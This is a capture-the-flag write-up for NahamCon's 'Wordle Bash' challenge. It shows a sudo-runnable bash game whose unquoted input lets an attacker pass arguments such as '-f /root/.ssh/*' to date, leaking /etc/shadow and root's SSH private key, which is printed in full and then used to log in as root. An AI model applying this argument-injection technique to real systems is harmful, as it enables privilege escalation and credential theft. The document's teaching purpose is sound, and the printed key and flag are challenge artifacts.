# **Wordle Bash** (294 pts, 75 solves)

## **Description**
We put a new novel spin on the old classic game of Wordle! Now it's written in bash! :D

Oh, and you aren't guessing words, this time...


## **Solution**

We log in and have a shell script called `wordle_bash.sh`.

```sh
#!/bin/bash

YEARS=("2020" "2021" "2022" "2023" "2024" "2025")
MONTHS=("01" "02" "03" "04" "05" "06" "07" "08" "09" "10" "11" "12" )
DAYS=("01" "02" "03" "04" "05" "06" "07" "08" "09" "10" "11" "12" "13" "14" "15" "16" "17" "18" "19" "20" "21" "22" "23" "24" "25" "26" "27" "28" "29" "30" "31")

YEARS_SIZE=${#YEARS[@]}
YEARS_INDEX=$(($RANDOM % $YEARS_SIZE))
YEAR=${YEARS[$YEARS_INDEX]}

MONTHS_SIZE=${#MONTHS[@]}
MONTHS_INDEX=$(($RANDOM % $MONTHS_SIZE))
MONTH=${MONTHS[$MONTHS_INDEX]}

DAYS_SIZE=${#DAYS[@]}
DAYS_INDEX=$(($RANDOM % $DAYS_SIZE))
DAY=${DAYS[$DAYS_INDEX]}

TARGET_DATE="${YEAR}-${MONTH}-${DAY}"

gum style \
  --foreground 212 --border-foreground 212 --border double \
  --align center --width 50 --margin "1 2" --padding "2 4" \
  'WORDLE DATE' 'Uncover the correct date!'

echo "We've selected a random date, and it's up to you to guess it!"

wordle_attempts=1
while [ $wordle_attempts -le 5 ]
do
  echo "Attempt $wordle_attempts:"
  echo "Please select the year you think we've chosen:"
  chosen_year=$(gum choose ${YEARS[@]})

  echo "Now, enter the month of your guess: "
  chosen_month=$(gum choose ${MONTHS[@]})

  echo "Finally, enter the day of your guess: "
  chosen_day=$(gum choose ${DAYS[@]})

  guess_date="$chosen_year-$chosen_month-$chosen_day"

  if ! date -d $guess_date; then
    echo "Invalid date! Your guess must be a valid date in the format YYYY-MM-DD."
    exit
  fi

  confirmed=1
  while [ $confirmed -ne 0 ]
  do
    gum confirm "You've entered '$guess_date'. Is that right?"
    confirmed=$?
    if [[ $confirmed -eq 0 ]]
    then
      break
    fi
    echo "Please select the date you meant:"
    guess_date=$(gum input --placeholder $guess_date)
  done

  if [[ $(date $guess_date) == $(date -d $TARGET_DATE +%Y-%m-%d) ]]; then
    gum style \
      --foreground 212 --border-foreground 212 --border double \
      --align center --width 50 --margin "1 2" --padding "2 4" \
      "Congratulations, you've won! You correctly guessed the date!" 'Your flag is:' $(cat /root/flag.txt)
    exit 0
  else
    echo "Sorry, that wasn't correct!"
    echo "====================================="
  fi

  wordle_attempts=$((wordle_attempts+1))
done

gum style \
  --foreground 212 --border-foreground 212 --border double \
  --align center --width 50 --margin "1 2" --padding "2 4" \
  "Sorry, you lost." "The correct date was $TARGET_DATE."
```

The main idea of this game is that we have 5 guesses to guess a target date, upon which it will `cat /root/flag.txt`.

I actually made an oversight in the beginning that definately cost me some time on this problem, I assumed that this shell script was owned by `root`, however it actually is owned by `user`.

```
-r-xr-xr-x 1 user user 2383 Jun 16 04:37 wordle_bash.sh
```

Initially I was entering in random numbers, and actually got the date correct! Only to be greeted with,
```
cat: /root/flag.txt: Permission denied
```

After a bit more investigation, I checked out the `/etc/sudoers` file and realized my mistake: I needed to run the program with sudo obviously...
```
# User privilege specification
root    ALL=(ALL:ALL) ALL
root    ALL=(ALL:ALL) NOPASSWD:ALL
user    ALL=(root) /home/user/wordle_bash.sh
```

Now when running `sudo ./wordle_bash.sh`, I played around with the `$guess_date` variable. It's pretty clear to see that we can run arbitrary parameters to `/bin/date`. 

```sh
 while [ $confirmed -ne 0 ]
  do
    gum confirm "You've entered '$guess_date'. Is that right?"
    confirmed=$?
    if [[ $confirmed -eq 0 ]]
    then
      break
    fi
    echo "Please select the date you meant:"
    guess_date=$(gum input --placeholder $guess_date)
  done
```

Date has a parameter `-f` which tries to read from a file. Using that... nope.
```
Please select the date you meant:
date: invalid date ‘[ Sorry, your flag will be displayed once you have code execution as root ]’
```

Seems we need to do a bit more. Here I was sort of just blindly guessing for files. I even used `date -f` to read `/etc/passwd` and `/etc/shadow` and managed to crack the root password (the password was also `userpass`...), but password login for root is not allowed via ssh, and `su` and `login` don't have the SUID bit set.

I then took a guess to see if there was anything in `/root/.ssh`, maybe there is a key?
```
Please select the date you meant: -f /root/.ssh/*
date: extra operand ‘/root/.ssh/id_rsa.pub’
```

Aha! There is stuff there! I then grabbed the `id_rsa`.
```
Please select the date you meant:
date: invalid date ‘-----BEGIN OPENSSH PRIVATE KEY-----’
date: invalid date ‘b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn’
date: invalid date ‘NhAAAAAwEAAQAAAYEAxllMaPu/ewDglK/+qcskWbUTSiQtLBBX4Ls5EGWmGbTdKh7K7trC’
date: invalid date ‘Nht9hbSx8Ei4cLQWhbbwcvIqDAgrXYO9Vb/sr/BEyk1aVVTpFfLuFbsyZNZTqmONajdsf9’
date: invalid date ‘Kl/4Qy9u8/3duhBYaeV0Am4tK9mzM8/D2YbzmYD+pK8GFwJDQG5RdFstj6NxXjROAsaj8H’
date: invalid date ‘U7HHvkNFctEMMBmquAaG85DZO83ZUWWASB702UNrc701Mhdf7Ln92D2aEhwMisdBjK/F83’
date: invalid date ‘K71YIcrpkuDTQYhms4SGUlYIlUaIhridKH3m3BgCNhC5mjsy5IkV0VwG/SRxew0adhHxT+’
date: invalid date ‘Gc9izi2yy1uW1wrJT0u8ImQhTm35R+cLD+SpWJSHswDxygCVHTUvVIngNakJvWXRKDmS3N’
date: invalid date ‘PjIu9gaJ3D69Q3BDlxcbluhjl2Z/5nenryUZdoVORnCf75YiWgTtI/FhS7HnHyw69LaJoH’
date: invalid date ‘1NPGh/mV730OsnqtdakxkHXd3CDhcwY5QjvJlFEdAAAFgAlNDvEJTQ7xAAAAB3NzaC1yc2’
date: invalid date ‘EAAAGBAMZZTGj7v3sA4JSv/qnLJFm1E0okLSwQV+C7ORBlphm03Soeyu7awjYbfYW0sfBI’
date: invalid date ‘uHC0FoW28HLyKgwIK12DvVW/7K/wRMpNWlVU6RXy7hW7MmTWU6pjjWo3bH/Spf+EMvbvP9’
date: invalid date ‘3boQWGnldAJuLSvZszPPw9mG85mA/qSvBhcCQ0BuUXRbLY+jcV40TgLGo/B1Oxx75DRXLR’
date: invalid date ‘DDAZqrgGhvOQ2TvN2VFlgEge9NlDa3O9NTIXX+y5/dg9mhIcDIrHQYyvxfNyu9WCHK6ZLg’
date: invalid date ‘00GIZrOEhlJWCJVGiIa4nSh95twYAjYQuZo7MuSJFdFcBv0kcXsNGnYR8U/hnPYs4tsstb’
date: invalid date ‘ltcKyU9LvCJkIU5t+UfnCw/kqViUh7MA8coAlR01L1SJ4DWpCb1l0Sg5ktzT4yLvYGidw+’
date: invalid date ‘vUNwQ5cXG5boY5dmf+Z3p68lGXaFTkZwn++WIloE7SPxYUux5x8sOvS2iaB9TTxof5le99’
date: invalid date ‘DrJ6rXWpMZB13dwg4XMGOUI7yZRRHQAAAAMBAAEAAAGAECAzdPeUCOaN264hU2Gcz3RIIL’
date: invalid date ‘InQAVbd6hmX8hmhCwvAkfQR4dehx1ItmWgmoChtNFXYWtO9NwZAghp/3zV7aegZmoaKvkL’
date: invalid date ‘UT5e2DYmGCXeLNI7VBzVjZ9QQWYkBng+LShPYMoEjIP2J0bObTN6pH26cBF77VMD42Cw01’
date: invalid date ‘vrTO4z6ffbO/VQW8kk7zUV4f9vfjpJGyqx9enmsURs8PA1lDjLCIXYV2Sb/4EQzAHOCxyv’
date: invalid date ‘Zfv+LwCsvCIUqXNBVnO+N7hg5b/zh7gyvuzHq/vyOTjkNceQa7SZ/egeclWGkkYttUzUr1’
date: invalid date ‘0cveVqXTM2tfJhv8+cobJcmO7IccjsOyL+zYPR3mN/Q1nUvGyAERppXfhwTAZ5ljMRDkv/’
date: invalid date ‘KUy7IJ3Q9FnSVdqkni2u6ErHEer0/TKXAT92LYQXzTczd6hGvh+IADlmOLzU2d0RfkPZZ4’
date: invalid date ‘8GKvZfThN1OSMVpcwJMVeILWP6uz9WnnUAXgLIUriJK7rrsHpH0MNTmfTT9v5VSH3RAAAA’
date: invalid date ‘wB2od8rr4IU8AkpZ/kE9kY5a/INNsvSdUA6sn/5Fwso19fiPz2vYdP9fJMYjShV1wb8UFt’
date: invalid date ‘cajFvnnj2DnClU0imh1eC0fB5+vAmJvx8Qq9NWcmz7aejvZrBdIFbqGYr5krc5KvmizYVC’
date: invalid date ‘+tII4u4s5SFcvcZwmuIsWJQjbXA7VVa8v8Y10YJdeYsl3YpKqJdU0xPkt2Y2IgZxTJ4Dd9’
date: invalid date ‘MKgcPTBdOVuKA8r8ALCth9OV74k1GOEpLbDIY4gFiXbi7crQAAAMEA2Z0ZtNS6bUEq61DF’
date: invalid date ‘6758uI3wIeYe8NoGyxlH/oTGVqy5KfQ9vCochcSx0yov4MSZBY+foE8OAxNvAxBSV+2CnQ’
date: invalid date ‘4OHnZnKa9teSvphUCmnt4Va7CWRzmVmNiKlpMOky2P8Zfv3LdgpwrAbwxBL1HQv/eivXDm’
date: invalid date ‘0BQCxuiaOp5/3nz+K+IvA/cBhsJwS6bWMtAhcfzKfS7/NzgcLTtlVR1Li/vC/r69iDs/xi’
date: invalid date ‘zDGCjuOrjsWhqqIqjhMGZjguTz9Y+FAAAAwQDpVj6g1OSqzZ5Kw805VTcbRRTmiHb00hht’
date: invalid date ‘U4LYw5xV+1iNJ8/BijiIZaT/zXnZbzIzLBnPbzqNLW5sBPJ+eMo5wY5ZNKa/qMd4Rdj6Hx’
date: invalid date ‘pAVbuqv6sYPhj2Xl6R/yJUVRw6OGoIa0SEumrmXzbJTT25o9FgItuKOpRRWd9l4gB8Pa1I’
date: invalid date ‘LLomZzqAmpdZtcMX+ihYPAJL5UBGPkD4CO7JwHm+W36NpAEKhi/Fh6D/U/RPEtwXZEbaWY’
date: invalid date ‘vIJis7FbO7UrkAAAAJa2FsaUBrYWxpAQI=’
date: invalid date ‘-----END OPENSSH PRIVATE KEY-----’
```

And with this, was able to ssh into root. In the root directory, there was a binary, which I could then execute to get the flag.
```console
abhi@abhi-omen:~/Nahamcon/wordle$ ssh -i id_rsa -p 31308 root@challenge.nahamcon.com

root@wordle:~# ls
flag.txt  get_flag_random_suffix_345674837560870345
root@wordle:~# file get_flag_random_suffix_345674837560870345
get_flag_random_suffix_345674837560870345: ELF 64-bit LSB pie executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib/ld-musl-x86_64.so.1, with debug_info, not stripped
root@wordle:~# ./get_flag_random_suffix_345674837560870345
Please press Enter within one second to retrieve the flag.

flag{2b9576d1a7a631b8ce12595f80f3aba5}
```




## **Flag**: *`flag{2b9576d1a7a631b8ce12595f80f3aba5}`*
